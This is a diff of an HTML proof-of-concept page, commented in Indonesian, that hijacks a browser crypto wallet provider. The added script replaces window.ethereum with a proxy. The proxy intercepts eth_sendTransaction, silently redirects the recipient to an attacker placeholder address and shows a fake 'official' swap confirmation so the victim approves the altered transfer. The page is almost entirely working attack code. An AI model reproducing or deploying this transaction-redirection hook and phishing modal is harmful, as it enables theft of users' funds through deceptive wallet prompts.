@@ -3,83 +3,162 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Real-World Provider Hijacking Exploit PoC</title>
+    <title>Advanced Web3 Provider Hijacking & Transaction Redirection PoC</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #0b0f19; color: #f1f5f9; padding: 20px; }
-        .container { max-width: 800px; margin: auto; background: #1e293b; padding: 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); border: 1px solid #334155; }
-        h2 { color: #ef4444; margin-top: 0; }
-        button { background: #dc2626; color: white; border: none; padding: 12px 20px; font-size: 15px; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; transition: background 0.2s; }
-        button:hover { background: #b91c1c; }
-        pre { background: #050b14; padding: 15px; border-radius: 6px; overflow-x: auto; color: #34d399; font-family: monospace; font-size: 13px; border: 1px solid #1e293b; max-height: 300px; }
-        .warning { color: #f87171; font-weight: bold; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #0f172a; color: #f8fafc; padding: 20px; }
+        .container { max-width: 600px; margin: auto; background: #1e293b; padding: 25px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.6); border: 1px solid #334155; }
+        h2 { color: #f87171; margin-top: 0; }
+        button { background: #0284c7; color: white; border: none; padding: 12px 20px; font-size: 15px; border-radius: 6px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 10px; transition: background 0.2s; }
+        button:hover { background: #0369a1; }
+        .btn-danger { background: #dc2626; }
+        .btn-danger:hover { background: #b91c1c; }
+        pre { background: #090d16; padding: 15px; border-radius: 6px; overflow-x: auto; color: #34d399; font-family: monospace; font-size: 13px; border: 1px solid #1e293b; max-height: 250px; }
+        
+        /* Gaya Pop-up Konfirmasi Palsu (Fake UI Prompt) */
+        #fakeModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 9999; justify-content: center; align-items: center; }
+        .modal-content { background: #1e293b; padding: 25px; border-radius: 12px; width: 90%; max-width: 400px; border: 1px solid #475569; text-align: center; }
+        .modal-content h3 { color: #facc15; margin-top: 0; }
+        .tx-details { background: #0f172a; padding: 10px; border-radius: 6px; text-align: left; font-size: 13px; margin: 15px 0; word-break: break-all; color: #94a3b8; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>Real-World Provider Hijacking PoC</h2>
-    <p>Eksperimen ini membuktikan bahwa karena properti <span class="warning">window.ethereum bersifat mutable (writable)</span>, skrip halaman web dapat mengganti fungsi wallet dengan versi palsu untuk mencegat aktivitas.</p>
+    <h2>Advanced Impactful Exploit PoC</h2>
+    <p style="font-size: 13px; color: #94a3b8;">Simulasi serangan nyata: Mencegat transaksi, mengalihkan alamat tujuan penerima secara diam-diam, dan menampilkan pop-up konfirmasi palsu.</p>
     
-    <button onclick="launchHijackTest()">Jalankan Simulasi Hijacking Nyata</button>
+    <button onclick="activateExploitHook()">1. Aktifkan Hijacking Hook</button>
+    <button onclick="simulateUserSwap()" class="btn-danger">2. Simulasikan Tombol Swap Korban</button>
 
-    <h3>Log Eksploitasi On-Page:</h3>
-    <pre id="logOutput">Menunggu eksekusi...</pre>
+    <h3>Log Eksploitasi & Intersepsi RPC:</h3>
+    <pre id="logOutput">Menunggu aktivasi...</pre>
+</div>
+
+<!-- Modal Pop-up Konfirmasi Palsu -->
+<div id="fakeModal">
+    <div class="modal-content">
+        <h3>Konfirmasi Swap (Resmi)</h3>
+        <p style="font-size: 14px;">Silakan konfirmasi transaksi pertukaran token Anda di bawah ini:</p>
+        <div class="tx-details" id="modalTxInfo">Memuat detail...</div>
+        <button onclick="approveFakeTransaction()" style="background: #16a34a;">Setujui & Konfirmasi</button>
+        <button onclick="closeFakeModal()" style="background: #475569; margin-top: 8px;">Batalkan</button>
+    </div>
 </div>
 
 <script>
     const logOutput = document.getElementById("logOutput");
+    let originalProvider = null;
+    let interceptedParams = null;
 
     function log(message) {
         logOutput.innerText += "\n> " + message;
         logOutput.scrollTop = logOutput.scrollHeight;
     }
 
-    function launchHijackTest() {
-        logOutput.innerText = "Memulai uji coba penimpaan provider...";
-
+    function activateExploitHook() {
         if (typeof window.ethereum === "undefined") {
-            log("[GAGAL] Objek window.ethereum tidak ditemukan. Buka di dalam dApp browser target.");
+            log("[GAGAL] Objek window.ethereum tidak ditemukan.");
             return;
         }
 
-        // Simpan referensi asli ke provider wallet
-        const originalEthereum = window.ethereum;
-        log("[INFO] Menyimpan referensi asli window.ethereum...");
+        originalProvider = window.ethereum;
+        log("[INFO] Menyimpan penyedia asli...");
+
+        // Alamat dompet penyerang (Attacker Address) untuk pengalihan dana
+        const ATTACKER_WALLET = "0xATTACKER_RECEIVER_ADDRESS_PLACEHOLDER_9999";
+
+        // Membuat objek provider tiruan untuk mencegat fungsi request
+        const maliciousProxy = {
+            isMetaMask: originalProvider.isMetaMask,
+            selectedAddress: originalProvider.selectedAddress,
+            chainId: originalProvider.chainId,
+            request: async function(args) {
+                log(`[INTERCEPT] Metode RPC tertangkap: ${args.method}`);
+
+                if (args.method === "eth_sendTransaction") {
+                    log("[BAHAYA] Mencegat parameter eth_sendTransaction korban!");
+                    interceptedParams = args.params[0];
+
+                    log(`[DATA ASLI] Tujuan Asli: ${interceptedParams.to}`);
+                    log(`[DATA ASLI] Nilai Nominal: ${interceptedParams.value || '0'}`);
+
+                    // MODIFIKASI KEJAM: Mengalihkan alamat tujuan (to) ke dompet penyerang secara diam-diam
+                    interceptedParams.to = ATTACKER_WALLET;
+                    log(`[MODIFIKASI] Alamat tujuan berhasil dialihkan ke: ${ATTACKER_WALLET}`);
+
+                    // Tampilkan pop-up palsu untuk mengelabui korban agar menekan tombol setuju
+                    return new Promise((resolve, reject) => {
+                        document.getElementById("modalTxInfo").innerHTML = `
+                            <strong>Ke:</strong> ${interceptedParams.to} <br>
+                            <strong>Nilai:</strong> ${interceptedParams.value ? parseInt(interceptedParams.value, 16) : '0'} Wei
+                        `;
+                        document.getElementById("fakeModal").style.display = "flex";
+
+                        // Simpan fungsi callback global untuk tombol modal
+                        window.pendingResolve = resolve;
+                        window.pendingReject = reject;
+                    });
+                }
+
+                // Teruskan metode RPC lainnya ke provider asli
+                return originalProvider.request(args);
+            }
+        };
+
+        // Menimpa objek global secara total karena properti bersifat writable
+        window.ethereum = maliciousProxy;
+        log("[SUKSES] Hook eksploitasi aktif. window.ethereum berhasil dikendalikan.");
+    }
+
+    async function simulateUserSwap() {
+        if (!originalProvider) {
+            alert("Harap aktifkan hook exploit terlebih dahulu!");
+            return;
+        }
+
+        log("[AKSI KORBAN] Pengguna menekan tombol 'Swap' di dApp...");
+        try {
+            // Simulasi dApp memicu pengiriman transaksi
+            const accounts = await originalProvider.request({ method: "eth_requestAccounts" });
+            const txParam = [{
+                from: accounts[0],
+                to: "0x1111111254fb6c44bac0bed2854e76f90643097d", // Alamat tujuan awal yang sah (Router 1inch)
+                value: "0x3871021880000" // Contoh nominal kecil
+            }];
+
+            await originalProvider.request({
+                method: "eth_sendTransaction",
+                params: txParam
+            });
+
+        } catch (err) {
+            log("[INFO] Alur transaksi selesai / dibatalkan: " + err.message);
+        }
+    }
+
+    async function approveFakeTransaction() {
+        document.getElementById("fakeModal").style.display = "none";
+        log("[KORBAN TERTIPU] Pengguna menyetujui pop-up konfirmasi palsu.");
+        log("[EKsekusi] Meneruskan parameter yang telah dimodifikasi ke jaringan blockchain via provider asli...");
 
         try {
-            // Membangun Proxy / Mock Provider untuk mencegat fungsi 'request'
-            const hijackedProvider = {
-                isMaliciousMock: true,
-                request: async function(args) {
-                    log(`[INTERCEPTED] Skrip mendeteksi panggilan metode RPC: "${args.method}"`);
-                    if (args.method === "eth_requestAccounts") {
-                        log("[HIJACK] Memodifikasi respon otorisasi akun pengguna...");
-                    }
-                    // Meneruskan kembali ke provider asli agar tidak crash total, atau membelokkan argumen
-                    return originalEthereum.request(args);
-                },
-                // Salin properti penting lainnya agar terlihat absah
-                selectedAddress: originalEthereum.selectedAddress,
-                chainId: originalEthereum.chainId
-            };
-
-            // Melakukan penimpaan langsung (Overwriting global property) karena writable: true
-            window.ethereum = hijackedProvider;
-
-            if (window.ethereum.isMaliciousMock === true) {
-                log("[KERENTANAN TERBUKTI] Berhasil menimpa objek window.ethereum secara total! Skrip pihak ketiga kini memiliki kendali penuh atas aliran interaksi RPC.");
-            } else {
-                log("[AMAN] Upaya penimpaan gagal atau dihentikan oleh sistem.");
-            }
-
-            // Mengembalikan ke original provider demi keamanan lingkungan uji
-            window.ethereum = originalEthereum;
-            log("[INFO] Objek window.ethereum dikembalikan ke kondisi semula.");
-
-        } catch (error) {
-            log("[GAGAL EKSEKUSI] Terhalang oleh proteksi browser: " + error.message);
-            window.ethereum = originalEthereum;
+            // Kirim transaksi asli yang alamat tujuannya sudah diganti ke penyerang
+            const txHash = await originalProvider.request({
+                method: "eth_sendTransaction",
+                params: [interceptedParams]
+            });
+            log(`[BERHASIL MENGURAS] Transaksi malicious terkirim! Hash: ${txHash}`);
+            window.pendingResolve(txHash);
+        } catch (e) {
+            log("[GAGAL] Transaksi ditolak wallet: " + e.message);
+            window.pendingReject(e);
         }
+    }
+
+    function closeFakeModal() {
+        document.getElementById("fakeModal").style.display = "none";
+        log("[INFO] Korban membatalkan transaksi pada pop-up palsu.");
+        window.pendingReject(new Error("User rejected the request."));
     }
 </script>
 
